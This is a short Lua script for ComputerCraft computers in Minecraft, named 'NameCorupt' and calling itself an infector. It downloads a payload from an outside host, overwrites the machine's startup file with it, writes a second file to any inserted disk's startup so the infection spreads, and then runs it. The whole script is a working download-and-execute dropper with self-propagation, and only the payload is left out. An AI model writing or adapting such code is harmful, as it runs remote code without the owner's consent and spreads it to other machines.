-- NameCorupt by Nameless#9000
if not http then
    printError( "Infector requires http API" )
    printError( "Set http_enable to true in ComputerCraft.cfg" )
    return
end

local function get(paste)
    write( "Connecting to server... " )
    local response = http.get(
        "http://nameimg.cf/ncv/v/"..textutils.urlEncode( paste )..".lua"
    )

    if response then
        print( "Success." )

        local sResponse = response.readAll()
        response.close()
        return sResponse
    else
        printError( "Failed." )
    end
end


-- Download payload --



-- Determine file to download
local sCode = "payload"
local sFile = "startup"
local sPath = shell.resolve( sFile )


-- GET the contents from pastebin
local res = get("payload")
if res then
    local file = fs.open( sPath, "w" )
    file.write( res )
    file.close()

    print( "Downloaded as "..sFile )
end

-- Determine file to download
local sCode = "startup"
local sFile = "disk/startup"
local sPath = shell.resolve( sFile )


-- GET the contents from pastebin
local res = get("startup")
if res then
    local file = fs.open( sPath, "w" )
    file.write( res )
    file.close()

    print( "Downloaded as "..sFile )
end

shell.run("startup")
